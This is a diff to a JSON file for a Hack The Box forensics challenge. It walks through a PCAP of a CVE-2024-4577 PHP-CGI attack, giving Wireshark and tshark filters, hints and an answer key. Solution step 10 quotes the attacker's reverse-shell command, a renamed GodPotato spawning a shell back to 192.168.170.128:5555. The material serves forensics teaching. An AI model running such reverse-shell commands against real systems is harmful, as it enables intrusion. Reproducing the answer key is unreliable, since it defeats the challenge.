@@ -5,71 +5,107 @@
   "htbUrl": "https://app.hackthebox.com/sherlocks/PacketPuzzle",
   "difficulty": "easy",
   "estimatedTime": "2-3 hours",
-  "keyTakeaway": "CVE-2024-4577 PHP-CGI exploitation — detecting argument injection attacks against PHP servers and tracking post-exploitation privilege escalation",
-  "tags": ["wireshark", "php-cgi", "cve-2024-4577", "argument-injection", "privilege-escalation", "godpotato"],
+  "keyTakeaway": "CVE-2024-4577 PHP-CGI exploitation — detecting port scans, identifying web application vulnerabilities from HTTP traffic, and tracing post-exploitation privilege escalation attempts",
+  "tags": ["wireshark", "php-cgi", "cve-2024-4577", "argument-injection", "port-scan", "privilege-escalation", "godpotato", "tshark"],
   "fundamentals": {
-    "content": "## CVE-2024-4577: PHP-CGI Argument Injection\n\n### The Vulnerability\n\nCVE-2024-4577 is a **critical argument injection vulnerability** in PHP when running in CGI mode on Windows. It allows remote code execution by exploiting how Windows handles character encoding in command-line arguments.\n\nThe attack works by sending specially crafted HTTP requests that inject arguments into the PHP-CGI binary, bypassing previous mitigations for CVE-2012-1823.\n\n### How It Appears in Traffic\n\nThe exploitation sends HTTP requests with specific patterns:\n- POST requests to PHP endpoints\n- Encoded characters that exploit the Windows Best-Fit character mapping\n- Commands embedded in the request body that get executed server-side\n\n### Post-Exploitation: Privilege Escalation\n\nAfter gaining initial access via PHP-CGI, attackers typically:\n1. **Enumerate** the system (hostname, users, services, open ports)\n2. **Attempt privilege escalation** using tools like:\n   - **GodPotato** — exploits Windows service account impersonation\n   - **PrintSpoofer** — abuses print spooler for SYSTEM access\n   - **JuicyPotato** — COM object-based escalation\n\n### Network Forensics Approach\n\n| Phase | What to Analyze |\n|-------|----------------|\n| Recon | Nmap scans (SYN packets to multiple ports) |\n| Exploitation | HTTP POST requests with encoded payloads |\n| Post-exploitation | Reverse shell traffic, tool downloads |\n| Priv esc | Tool execution results in command output |\n\n### Port Scanning Detection\n\nBefore exploitation, attackers typically scan the target. In Wireshark:\n- **SYN scan**: Many SYN packets to sequential ports, most get RST responses\n- **Open ports**: SYN packets that receive SYN-ACK responses\n- Count open ports by filtering: `tcp.flags.syn == 1 && tcp.flags.ack == 1`",
+    "content": "## Web Exploitation Forensics: From Scan to Shell\n\nThis challenge covers a complete web exploitation attack — from initial port scan through CVE exploitation to privilege escalation attempt. It teaches you to identify each phase in a PCAP.\n\n### Phase 1: Detecting Port Scans\n\nBefore exploitation, attackers scan the target to find open ports. In Wireshark:\n\n**SYN scan** (most common): The attacker sends SYN packets to many ports. Open ports respond with SYN-ACK; closed ports respond with RST.\n\n```\n# Find SYN packets (scan probes)\ntcp.flags.syn == 1 && tcp.flags.ack == 0\n\n# Find SYN-ACK responses (open ports)\ntcp.flags.syn == 1 && tcp.flags.ack == 1 && ip.src == <target_ip>\n```\n\nTo count open ports, use tshark:\n```bash\ntshark -r capture.pcap \\\n  -Y 'ip.src == <target> && ip.dst == <attacker> && tcp.flags.syn == 1 && tcp.flags.ack == 1' \\\n  -T fields -e tcp.srcport | sort -u\n```\n\nThe first SYN-ACK chronologically reveals which port responded first during the scan.\n\n### Phase 2: CVE-2024-4577 — PHP-CGI Argument Injection\n\nCVE-2024-4577 is a critical argument injection vulnerability in PHP running in CGI mode on Windows. It exploits how Windows handles character encoding in command-line arguments, allowing remote code execution.\n\nIn PCAP traffic, the exploitation appears as:\n- HTTP POST requests to PHP endpoints\n- Specially crafted characters that exploit Windows Best-Fit character mapping\n- Commands embedded in the request body that execute server-side\n\nThe PHP version is usually visible in HTTP response headers (`X-Powered-By` or `Server` header).\n\n### Phase 3: Post-Exploitation via HTTP\n\nAfter achieving RCE, the attacker's commands and their output are visible in HTTP request/response bodies. Follow the TCP streams to read:\n- `whoami` output → reveals the user context\n- System enumeration commands\n- Tool downloads and execution attempts\n\n### Phase 4: Privilege Escalation with Potato Tools\n\n**Potato** tools (GodPotato, PrintSpoofer, JuicyPotato) are Windows privilege escalation tools that exploit service account impersonation to escalate from a low-privilege user to SYSTEM.\n\nIn PCAPs, you'll see:\n- The tool being downloaded via HTTP\n- Its execution and output in subsequent HTTP streams\n- Success or failure messages (e.g., `Win32Error:2` = file not found)\n\n### MITRE ATT&CK: Initial Access\n\nExploiting a vulnerability in a public-facing web application maps to **T1190** (Exploit Public-Facing Application) under the Initial Access tactic.",
     "toolReferences": [
       {
         "tool": "Wireshark",
         "commands": [
-          "Filter: tcp.flags.syn == 1 && tcp.flags.ack == 1 (open ports from scan)",
-          "Filter: http.request.method == POST (exploitation attempts)",
-          "Filter: http (examine request/response bodies for RCE output)",
-          "Follow TCP Stream on HTTP sessions to see command output",
-          "Statistics > Endpoints > TCP (identify scanning activity)"
+          "Filter: tcp.flags.syn == 1 && tcp.flags.ack == 1 — SYN-ACK (open ports)",
+          "Filter: http.request.method == POST — exploitation attempts",
+          "Filter: http && ip.src == <attacker> — attacker's HTTP traffic",
+          "Follow TCP Stream — read command output",
+          "Statistics → Conversations → TCP — identify scanning activity"
+        ]
+      },
+      {
+        "tool": "tshark",
+        "commands": [
+          "tshark -r file.pcap -Y 'filter' -T fields -e tcp.srcport | sort -u — list unique open ports"
         ]
       }
     ]
   },
   "hints": {
     "hints": [
-      "Start by looking for port scanning activity — many SYN packets from one IP to sequential ports on the target.",
-      "Count the open ports by filtering for SYN-ACK responses from the target during the scan phase.",
-      "The PHP version is often revealed in HTTP response headers (`X-Powered-By` or `Server` header).",
-      "Look at HTTP POST requests for the exploitation phase — the CVE-2024-4577 payload will be in the request.",
-      "After gaining access, the attacker runs system commands. Follow HTTP streams to see command output (whoami, hostname, etc.).",
-      "The privilege escalation attempt uses GodPotato — look for its execution and error output in the command results."
+      "Start by identifying the top talkers (`Statistics → Conversations → IPv4`). The IP sending the most packets to the server is the attacker.",
+      "Filter for SYN-ACK responses from the target to count open ports. The first SYN-ACK chronologically tells you which port responded first.",
+      "The PHP version is in HTTP response headers. The CVE is specific to PHP-CGI on Windows.",
+      "After the exploit succeeds, follow HTTP streams to read command output — `whoami` reveals the compromised user, and later streams show the privilege escalation attempt.",
+      "The attacker downloads a privilege escalation tool and renames it to look legitimate. The original name and the disguised name are both visible in the HTTP traffic.",
+      "The privilege escalation fails with a specific Win32 error. The full command line and error message are visible in the HTTP stream."
     ]
   },
   "solution": {
-    "content": "## Full Walkthrough\n\n**Scenario:** A Forela web server running PHP-CGI on Windows was targeted. The attacker performed reconnaissance, exploited CVE-2024-4577 for remote code execution, and attempted privilege escalation. Analyze the PCAP to reconstruct the full attack.\n\n**Key findings:**\n\n| Element | Detail |\n|---------|--------|\n| Open ports | 8 |\n| PHP version | 8.1.25 |\n| Compromised user | `cristo` |\n| Priv esc tool | GodPotato |\n| Priv esc result | Failed — `Win32Error:2` |",
+    "content": "## Full Walkthrough\n\n**Scenario:** You are an entry-level analyst at a cryptocurrency trading company. Suspicious activity was detected on the internal network, and you exported a PCAP for investigation. The analysis reveals a port scan, CVE exploitation, and a failed privilege escalation attempt.\n\n**Key learning:** This challenge covers the full attack lifecycle visible in network traffic — reconnaissance (port scan), exploitation (CVE-2024-4577), and post-exploitation (privilege escalation). Each phase leaves distinct traces in the PCAP.\n\n**Key infrastructure:**\n\n| Role | IP Address |\n|------|----------|\n| Attacker | `192.168.170.128` |\n| Victim (PHP server) | `192.168.170.130` |",
     "steps": [
       {
         "stepNumber": 1,
-        "description": "Detect the port scan and count open ports",
-        "command": "Wireshark filter: tcp.flags.syn == 1 && tcp.flags.ack == 1 && ip.src == <target_ip>",
-        "explanation": "Filter for SYN-ACK responses from the target server during the scanning phase. Each SYN-ACK indicates an open port. Count the unique destination ports — there are **8 open ports** on the target. This tells us the attack surface the attacker discovered before exploitation. **Answer: `8`**"
+        "description": "Identify the attacker's IP address",
+        "command": "Wireshark: Statistics → Conversations → IPv4, sort by packet count",
+        "explanation": "Open Conversations and sort by packet count. The IP sending the most packets (1083) to the server is the attacker — the high volume is consistent with a port scan.\n\n**Answer:** `192.168.170.128`"
       },
       {
         "stepNumber": 2,
-        "description": "Identify the PHP version",
-        "command": "Follow HTTP streams and check response headers",
-        "explanation": "Examine HTTP response headers from the web server. The `X-Powered-By` or `Server` header reveals the PHP version: **PHP 8.1.25**. This version running in CGI mode on Windows is vulnerable to CVE-2024-4577, which the attacker exploits. **Answer: `8.1.25`**"
+        "description": "Count the open ports discovered during the scan",
+        "command": "Wireshark filter: tcp.flags.syn == 1 && tcp.flags.ack == 1 && ip.src == 192.168.170.130",
+        "explanation": "Filter for SYN-ACK responses from the victim. Each SYN-ACK indicates an open port. Count the unique source ports — the 8 open ports are: 22, 80, 135, 139, 443, 445, 3389, 5357.\n\nAlternatively with tshark:\n```bash\ntshark -r NetworkTraffic.pcap \\\n  -Y 'ip.src == 192.168.170.130 && ip.dst == 192.168.170.128 && tcp.flags.syn == 1 && tcp.flags.ack == 1' \\\n  -T fields -e tcp.srcport | sort -u\n```\n\n**Answer:** `8`"
       },
       {
         "stepNumber": 3,
-        "description": "Analyze the CVE-2024-4577 exploitation",
-        "command": "Wireshark filter: http.request.method == POST",
-        "explanation": "Filter for POST requests to find the exploitation attempts. The attacker sends crafted POST requests that exploit PHP-CGI's argument injection vulnerability. The payload uses Windows Best-Fit character encoding to inject arguments that cause PHP to execute arbitrary commands on the server."
+        "description": "Find the first open port that responded",
+        "command": "Same filter as step 2, sorted chronologically",
+        "explanation": "With the SYN-ACK filter active, look at the first response packet chronologically. During the scan, port 22 (SSH) was the first to respond with a SYN-ACK.\n\n**Answer:** `22`"
       },
       {
         "stepNumber": 4,
-        "description": "Identify the compromised user account",
-        "command": "Follow HTTP stream containing whoami output",
-        "explanation": "After achieving RCE, the attacker runs `whoami` to identify their access level. Follow the HTTP stream containing the command output — the PHP-CGI process runs as user `cristo`. This is the user context the attacker operates in after exploitation. **Answer: `cristo`**"
+        "description": "Identify the CVE exploited",
+        "command": "Wireshark filter: http.request.method == POST && ip.src == 192.168.170.128",
+        "explanation": "Filter for POST requests from the attacker. The exploitation targets PHP-CGI with specially crafted argument injection payloads. This is CVE-2024-4577 — a critical vulnerability in PHP-CGI on Windows that bypasses previous mitigations.\n\n**Answer:** `CVE-2024-4577`"
       },
       {
         "stepNumber": 5,
-        "description": "Find the privilege escalation attempt",
-        "command": "Follow HTTP streams to see post-exploitation commands",
-        "explanation": "The attacker attempts to escalate from `cristo` to SYSTEM using **GodPotato** — a Windows privilege escalation tool that exploits service account impersonation. Look for the tool download or execution in the HTTP traffic. However, the attempt **fails** with error `Win32Error:2` (file not found), meaning the escalation was unsuccessful. **Answer: GodPotato, failed with `Win32Error:2`**"
+        "description": "Identify the vulnerable product and version",
+        "command": "Follow HTTP streams — check response headers",
+        "explanation": "Examine HTTP response headers from the web server. The `X-Powered-By` or `Server` header reveals the PHP version running in CGI mode on Windows.\n\n**Answer:** `PHP 8.1.25`"
       },
       {
         "stepNumber": 6,
-        "description": "Reconstruct the full attack",
-        "command": "Correlate all phases",
-        "explanation": "Complete attack chain: (1) Attacker scans target, finds 8 open ports → (2) Identifies PHP 8.1.25 running in CGI mode → (3) Exploits CVE-2024-4577 argument injection for RCE → (4) Gains access as user `cristo` → (5) Attempts privilege escalation with GodPotato → (6) Priv esc fails with `Win32Error:2`. Despite the failed escalation, the attacker still achieved code execution as `cristo`. The forensic value here is in tracing the full methodology."
+        "description": "Find the compromised user account",
+        "command": "Follow TCP Stream on the successful exploit",
+        "explanation": "After achieving RCE, the attacker runs `whoami`. Follow the HTTP stream containing the command output — the PHP-CGI process runs as a specific user.\n\n**Answer:** `cristo`"
+      },
+      {
+        "stepNumber": 7,
+        "description": "Find the timestamp of the initial foothold",
+        "command": "Check the timestamp of the successful exploit POST request",
+        "explanation": "The final POST request that achieves the foothold — where the attacker's command executes and the server responds — has a specific UTC timestamp.\n\n**Answer:** `2025-01-22 09:47:32`"
+      },
+      {
+        "stepNumber": 8,
+        "description": "Map the initial access to MITRE ATT&CK",
+        "command": "MITRE ATT&CK → Initial Access tactic",
+        "explanation": "Exploiting a vulnerability in a public-facing web application maps to MITRE ATT&CK technique T1190 (Exploit Public-Facing Application).\n\n**Answer:** `T1190`"
+      },
+      {
+        "stepNumber": 9,
+        "description": "Identify the privilege escalation tool",
+        "command": "Follow TCP streams after exploitation — look for tool downloads",
+        "explanation": "In the post-exploitation HTTP streams, the attacker downloads a well-known Windows privilege escalation tool from the potato family, specifically targeting .NET 4.\n\n**Answer:** `GodPotato-NET4.exe`"
+      },
+      {
+        "stepNumber": 10,
+        "description": "Find the privilege escalation command line",
+        "command": "Follow TCP Stream showing the privilege escalation attempt",
+        "explanation": "The attacker uses the downloaded tool (renamed to look legitimate) to attempt spawning a reverse shell. The full command line is visible in the HTTP stream, showing the renamed tool, its arguments, and the target IP and port for the reverse shell.\n\n**Answer:** `./TimeProvider.exe -cmd \"time.exe 192.168.170.128 5555 -e cmd\"`"
+      },
+      {
+        "stepNumber": 11,
+        "description": "Find the privilege escalation error",
+        "command": "Read the command output in the same HTTP stream",
+        "explanation": "The privilege escalation attempt fails. The error message is visible in the HTTP response — it indicates that the renamed binary could not be found (Win32 error code 2 = file not found).\n\n**Answer:** `Cannot create process Win32Error:2`"
       }
     ]
   },
